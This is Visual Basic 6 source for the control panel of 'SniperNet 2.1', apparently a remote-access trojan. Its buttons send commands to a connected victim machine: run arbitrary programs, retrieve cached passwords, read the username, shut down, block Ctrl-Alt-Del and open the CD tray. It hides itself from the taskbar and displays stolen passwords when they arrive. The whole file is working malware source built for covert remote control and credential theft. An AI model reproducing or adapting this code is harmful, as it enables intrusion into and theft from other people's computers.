VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmpeerA 
   BackColor       =   &H00800000&
   BorderStyle     =   0  'None
   Caption         =   "SniperNet 2.1"
   ClientHeight    =   2685
   ClientLeft      =   4845
   ClientTop       =   4410
   ClientWidth     =   5730
   ControlBox      =   0   'False
   Icon            =   "form.frx":0000
   MaxButton       =   0   'False
   MinButton       =   0   'False
   MouseIcon       =   "form.frx":0442
   PaletteMode     =   1  'UseZOrder
   Picture         =   "form.frx":0884
   ScaleHeight     =   2685
   ScaleWidth      =   5730
   ShowInTaskbar   =   0   'False
   Begin VB.TextBox mac 
      Enabled         =   0   'False
      Height          =   285
      Left            =   4020
      TabIndex        =   24
      Top             =   1230
      Width           =   1170
   End
   Begin VB.TextBox Text1 
      Alignment       =   1  'Right Justify
      Height          =   255
      Left            =   4170
      TabIndex        =   19
      Top             =   420
      Width           =   1230
   End
   Begin VB.Timer Timer1 
      Left            =   -30
      Top             =   420
   End
   Begin VB.Timer ping 
      Interval        =   1000
      Left            =   5475
      Top             =   1575
   End
   Begin VB.TextBox exec 
      Height          =   285
      Left            =   1200
      TabIndex        =   5
      Text            =   "c:\"
      Top             =   1215
      Width           =   1500
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   285
      Left            =   4935
      TabIndex        =   4
      Text            =   "---ms"
      Top             =   690
      Width           =   465
   End
   Begin VB.ComboBox drivelist 
      Height          =   315
      Left            =   4140
      TabIndex        =   3
      Text            =   "C"
      Top             =   2175
      Width           =   615
   End
   Begin VB.TextBox Text3 
      Height          =   300
      Left            =   2025
      TabIndex        =   2
      Top             =   5640
      Width           =   2550
   End
   Begin VB.Timer connectiontimer 
      Interval        =   2000
      Left            =   4230
      Top             =   840
   End
   Begin VB.TextBox Text6 
      Height          =   315
      Left            =   1035
      TabIndex        =   1
      Text            =   "Text6"
      Top             =   0
      Width           =   360
   End
   Begin VB.Timer Timer7 
      Interval        =   1
      Left            =   105
      Top             =   555
   End
   Begin VB.TextBox Text7 
      Height          =   300
      Left            =   405
      TabIndex        =   0
      Text            =   "Text7"
      Top             =   30
      Width           =   630
   End
   Begin MSWinsockLib.Winsock tcp 
      Left            =   90
      Top             =   60
      _ExtentX        =   741
      _ExtentY        =   741
      RemotePort      =   667
      LocalPort       =   666
   End
   Begin VB.Label cachedpwds 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   435
      Left            =   4560
      TabIndex        =   25
      Top             =   1620
      Width           =   750
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   765
      Left            =   525
      MouseIcon       =   "form.frx":49CA8
      MousePointer    =   99  'Custom
      TabIndex        =   23
      Top             =   405
      Width           =   2670
   End
   Begin VB.Label drivespace 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   420
      Left            =   3210
      TabIndex        =   22
      Top             =   2100
      Width           =   915
   End
   Begin VB.Label brightdarkness 
      BackStyle       =   0  'Transparent
      Height          =   690
      Left            =   5130
      MouseIcon       =   "form.frx":4A0EA
      MousePointer    =   99  'Custom
      TabIndex        =   21
      Top             =   2235
      Width           =   975
   End
   Begin VB.Label minimized 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "_"
      ForeColor       =   &H00FFFFFF&
      Height          =   285
      Left            =   5235
      TabIndex        =   20
      Top             =   150
      Width           =   165
   End
   Begin VB.Label try 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   210
      Left            =   3255
      MouseIcon       =   "form.frx":4A52C
      MousePointer    =   99  'Custom
      TabIndex        =   18
      Top             =   705
      Width           =   1110
   End
   Begin VB.Label closecd 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   225
      Left            =   1935
      TabIndex        =   17
      Top             =   1770
      Width           =   465
   End
   Begin VB.Label opencd 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   210
      Left            =   1065
      TabIndex        =   16
      Top             =   1770
      Width           =   435
   End
   Begin VB.Label disable 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   420
      Left            =   2550
      TabIndex        =   15
      Top             =   1590
      Width           =   780
   End
   Begin VB.Label block 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   390
      Left            =   3465
      MouseIcon       =   "form.frx":4A96E
      TabIndex        =   14
      Top             =   1590
      Width           =   975
   End
   Begin VB.Label screensaver 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   180
      Left            =   270
      TabIndex        =   13
      Top             =   2355
      Width           =   1335
   End
   Begin VB.Label getuser 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   465
      Left            =   1965
      TabIndex        =   12
      Top             =   2055
      Width           =   870
   End
   Begin VB.Label shutdown 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   240
      Left            =   360
      TabIndex        =   11
      Top             =   2055
      Width           =   1215
   End
   Begin VB.Label messagesend 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   495
      Left            =   45
      TabIndex        =   10
      Top             =   1530
      Width           =   855
   End
   Begin VB.Label execute 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      ForeColor       =   &H80000008&
      Height          =   135
      Left            =   240
      TabIndex        =   9
      Top             =   1290
      Width           =   975
   End
   Begin VB.Label quit 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BackStyle       =   0  'Transparent
      Caption         =   "X"
      ForeColor       =   &H00FFFFFF&
      Height          =   300
      Left            =   5430
      TabIndex        =   8
      Top             =   165
      Width           =   300
   End
   Begin VB.Label Label9 
      BackStyle       =   0  'Transparent
      Caption         =   "IP:"
      ForeColor       =   &H00FFFFFF&
      Height          =   315
      Left            =   4140
      TabIndex        =   7
      Top             =   75
      Width           =   345
   End
   Begin VB.Label Label23 
      BackStyle       =   0  'Transparent
      Caption         =   "negativ -"
      ForeColor       =   &H000000C0&
      Height          =   255
      Left            =   4245
      TabIndex        =   6
      Top             =   990
      Width           =   1335
   End
End
Attribute VB_Name = "frmpeerA"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function CreatePolygonRgn Lib "gdi32" (lpPoint As POINTAPI, ByVal nCount As Long, ByVal nPolyFillMode As Long) As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal x1 As Long, ByVal y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function CreateRoundRectRgn Lib "gdi32" (ByVal x1 As Long, ByVal y1 As Long, ByVal X2 As Long, ByVal Y2 As Long, ByVal X3 As Long, ByVal Y3 As Long) As Long
Private Declare Function CreateEllipticRgn Lib "gdi32" (ByVal x1 As Long, ByVal y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function CombineRgn Lib "gdi32" (ByVal hDestRgn As Long, ByVal hSrcRgn1 As Long, ByVal hSrcRgn2 As Long, ByVal nCombineMode As Long) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long
Private Declare Function sendmessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function ReleaseCapture Lib "user32" () As Long
Private Type POINTAPI
   X As Long
   Y As Long
End Type
Private Const RGN_AND = 1
Private Const RGN_COPY = 5
Private Const RGN_DIFF = 4
Private Const RGN_OR = 2
Private Const RGN_XOR = 3
Private textprog, freiordner, comfile, compname As String
Dim richtung As Integer
Private a, direction As Boolean
Private i As Integer
'Dies ist der Code für die ungewöhnliche Form der Form
Private Function CreateFormRegion() As Long
    Dim ResultRegion As Long, HolderRegion As Long, ObjectRegion As Long, nRet As Long
    Dim PolyPoints() As POINTAPI
    ResultRegion = CreateRectRgn(0, 0, 0, 0)
    HolderRegion = CreateRectRgn(0, 0, 0, 0)
    ObjectRegion = CreateEllipticRgn(5, 14, 351, 164)
    nRet = CombineRgn(ResultRegion, ObjectRegion, ObjectRegion, RGN_COPY)
    DeleteObject ObjectRegion
    ObjectRegion = CreateRectRgn(5, 89, 350, 172)
    nRet = CombineRgn(HolderRegion, ResultRegion, ResultRegion, RGN_COPY)
    nRet = CombineRgn(ResultRegion, HolderRegion, ObjectRegion, 2)
    DeleteObject ObjectRegion
    ReDim PolyPoints(0 To 2)
    PolyPoints(0).X = 177
    PolyPoints(0).Y = 13
    PolyPoints(1).X = 373
    PolyPoints(1).Y = 13
    PolyPoints(2).X = 348
    PolyPoints(2).Y = 86
    ObjectRegion = CreatePolygonRgn(PolyPoints(0), 3, 1)
    nRet = CombineRgn(HolderRegion, ResultRegion, ResultRegion, RGN_COPY)
    nRet = CombineRgn(ResultRegion, HolderRegion, ObjectRegion, 2)
    DeleteObject ObjectRegion
    ObjectRegion = CreateEllipticRgn(335, 158, 361, 180)
    nRet = CombineRgn(HolderRegion, ResultRegion, ResultRegion, RGN_COPY)
    nRet = CombineRgn(ResultRegion, HolderRegion, ObjectRegion, 2)
    DeleteObject ObjectRegion
    ObjectRegion = CreateEllipticRgn(3, 157, 19, 175)
    nRet = CombineRgn(HolderRegion, ResultRegion, ResultRegion, RGN_COPY)
    nRet = CombineRgn(ResultRegion, HolderRegion, ObjectRegion, 2)
    DeleteObject ObjectRegion
    ObjectRegion = CreateEllipticRgn(367, 14, 369, 15)
    nRet = CombineRgn(HolderRegion, ResultRegion, ResultRegion, RGN_COPY)
    nRet = CombineRgn(ResultRegion, HolderRegion, ObjectRegion, 2)
    DeleteObject ObjectRegion
    ObjectRegion = CreateEllipticRgn(363, 8, 377, 20)
    nRet = CombineRgn(HolderRegion, ResultRegion, ResultRegion, RGN_COPY)
    nRet = CombineRgn(ResultRegion, HolderRegion, ObjectRegion, 2)
    DeleteObject ObjectRegion
    CreateFormRegion = ResultRegion
End Function


'als nächstes Drag & Drop für die Form
Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    ReleaseCapture
    sendmessage Me.hwnd, &HA1, 2, 0&
End Sub

Private Sub Form_Load()
On Error GoTo 0
    Dim nRet As Long
    nRet = SetWindowRgn(Me.hwnd, CreateFormRegion, True)

If App.PrevInstance Then
    MsgBox "Program already loaded.", vbOKOnly, "loading"
    End
End If

If tcp.State <> sckClosed Then tcp.Close
    tcp.Close

Call GoSystemTray
    
ip = "127.0.0.1"
tcp.RemoteHost = ip     'IP des "Ofers" aus Konfigurationsdatei zuordnen
Text1 = ip    'im Prog IP anzeigen

drivelist.AddItem "C"
drivelist.AddItem "D"
drivelist.AddItem "E"

frmpeerA.Visible = True
End Sub
Private Sub Form_Unload(Cancel As Integer)
tcp.Close
     VBGTray.cbSize = Len(VBGTray)
     VBGTray.hwnd = Me.hwnd
     VBGTray.uId = vbNull
     Call Shell_NotifyIcon(NIM_DELETE, VBGTray)
End Sub
Private Sub exit_Click()
tcp.Close
End
     VBGTray.cbSize = Len(VBGTray)
     VBGTray.hwnd = Me.hwnd
     VBGTray.uId = vbNull
     Call Shell_NotifyIcon(NIM_DELETE, VBGTray)
End Sub

Private Sub Label1_Click()
Shell "start http://www.brightdarkness.de", vbHide
End Sub

Private Sub quit_Click()
msg = MsgBox("enough supervisor access?", vbYesNo, "{([--==SnIpErNeT==--])}")
If msg = vbYes Then
    End
End If
     VBGTray.cbSize = Len(VBGTray)
     VBGTray.hwnd = Me.hwnd
     VBGTray.uId = vbNull
     Call Shell_NotifyIcon(NIM_DELETE, VBGTray)
tcp.Close
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
     VBGTray.cbSize = Len(VBGTray)
     VBGTray.hwnd = Me.hwnd
     VBGTray.uId = vbNull
     Call Shell_NotifyIcon(NIM_DELETE, VBGTray)
End Sub


Private Sub minimized_Click()
        frmpeerA.WindowState = vbMinimized
End Sub


'Icon und Kontrolle im Systemtray
Private Sub GoSystemTray()
     VBGTray.cbSize = Len(VBGTray)
     VBGTray.hwnd = Me.hwnd
     VBGTray.uId = vbNull
     VBGTray.uFlags = NIF_ICON Or NIF_TIP Or NIF_MESSAGE
     VBGTray.ucallbackMessage = WM_MOUSEMOVE
     VBGTray.hIcon = Me.Icon
     VBGTray.szTip = "SnIpErNeT by ReAl SnIpEr" & vbNullChar
     Call Shell_NotifyIcon(NIM_ADD, VBGTray)
     App.TaskVisible = False
     Me.Hide
End Sub

'Icon und Kontrolle im Systemtray
Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
     Static lngMsg As Long
     Static blnFlag As Boolean
     Dim result As Long
    lngMsg = X / Screen.TwipsPerPixelX
     If blnFlag = False Then
        blnFlag = True
        Select Case lngMsg
        Case WM_LBUTTONDBLCLICK
        frmpeerA.WindowState = vbNormal
        Case WM_LBUTTONUP
        frmpeerA.WindowState = vbNormal
        frmpeerA.SetFocus
        Case WM_RBUTTONUP
        msg = MsgBox("enough supervisor access?", vbYesNo, "{([--==SnIpErNeT==--])}")
        If msg = vbYes Then
        End
        End If
        tcp.Close
    End Select
        blnFlag = False
     End If
End Sub

Private Sub execute_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "exe" + exec.Text
End If
End Sub

Private Sub getuser_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "cmdgetusername"
End If
End Sub

Private Sub ping_Timer()
If frmpeerA.Label23 = "connected!" Then
Timer1.Enabled = True
i = 0
send "cmdping"
End If
End Sub

Private Sub shutdown_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "cmdshutdown"
End If
End Sub

Private Sub cachedpwds_Click()
'''get cached pwds
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "cmdgetcachedpwds"
End If
End Sub

Private Sub opencd_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "cmdcdopen"
End If
End Sub

Private Sub closecd_Click()
If Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "cmdcdclose"
End If
End Sub
Private Sub block_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "cmdcrtaltdel"
End If
End Sub

Private Sub disable_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
    send "cmddisabledblclick"
End If
End Sub

Private Sub messagesend_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
frmpeerA.Visible = False
message.Show
End If
End Sub

Private Sub drivespace_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
Dim drivestr As String
drivestr = "cmdspace"
drivestr = drivestr + drivelist.Text
send drivestr
End If
End Sub

Private Sub screensaver_Click()
If frmpeerA.Label23 = "negativ -" Then
    MsgBox "You're not connected to remote Computer...!", vbCritical, "not connected"
    Else
send "cmds"
End If
End Sub

Private Sub about_Click()
frmpeerA.Visible = False
credits.Show
End Sub

Private Sub Label23_Click()
send "cmdstatusconnection"
End Sub

Private Sub brightdarkness_Click()
Shell "start http://www.brightdarkness.de", vbHide
End Sub

Private Sub tcp_Close()
If tcp.State <> 7 Then
tcp.Close
DoEvents
End If
End Sub

Private Sub tcp_Connect()
msg = "Connection succeeded !! to IP " & tcp.RemoteHost
MsgBox msg, vbOKOnly, "Connection established"
End Sub

Private Sub Timer1_Timer()
i = i + 1
End Sub

Private Sub connectiontimer_Timer()
If tcp.State = 7 Then
    Label23 = "connected!"
'If tcp.State <> sckClosed Then tcp.Close
'    tcp.Close
'    tcp.Connect
Else
    Label23 = "negativ -"
End If
End Sub


'Die folgenden Codeteile sind nur noch
'das Connection Handling auf der Winsock Control Basis
Private Sub try_Click()
If tcp.State <> sckClosed Then tcp.Close
If tcp.State <> sckOpen Then tcp.Close
'MsgBox tcp.State, vbOKOnly, "!"
tcp.RemoteHost = Text1.Text
tcp.Connect     'try to get a connection
End Sub

Private Sub Timer7_Timer()
Text6 = tcp.State
End Sub

Private Sub tcp_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
If Number = 10061 Then MsgBox "Error in Winsock.....connection terminated! Remote Host antwortet nicht. Vielleicht andere IP ?", vbCritical, "Winsock Fehler !!"
If tcp.State <> sckClosed Then tcp.Close
    tcp.Close
End Sub

Private Sub tcp_ConnectionRequest(ByVal requestID As Long)
If tcp.State <> sckClosed Then tcp.Close
tcp.Accept requestID
End Sub

Private Sub tcp_DataArrival(ByVal bytesTotal As Long)
Dim data As String
tcp.GetData data
Text7.Text = data
If data = "pingback" Then
    Text2.Text = i & "ms"
ElseIf Mid(data, 1, 4) = "pwds" Then
    MsgBox Mid(data, 5), vbOKOnly, "Cached pwds:"
ElseIf data = "statusisconnect" Then
    Label23.Caption = "connected.."
ElseIf Mid(data, 1, 3) = "mac" Then
mac.Text = Mid(data, 3)
ElseIf data = "computerboot" Then
    msg = MsgBox("WiNdOwS lOaDeD aGaIn.. :-)", vbOKOnly, "ReAkTiOn")
    Label23.Caption = "connected!"
    If Text1.Text = "blocked" Then
    send "cmdblock"
    End If
ElseIf data = "disconnected" Then
    msg = MsgBox("CoMpUtErS dIsCoNnEcTeD.. ;-(", vbOKOnly)
    Label23.Caption = "disconnected.."
ElseIf data > "Username:" And data < "Username:z" Then
    msg = MsgBox(data, vbOKOnly, "Username")
Else
    If Mid(data, 1, 3) <> "mac" Then
'        If data = -1 Then
'        MsgBox "Drive not available", vbCritical, "nit available"
'            Else
'            MsgBox data, vbOKOnly, "disk space"
'        End If
    End If
End If
End Sub

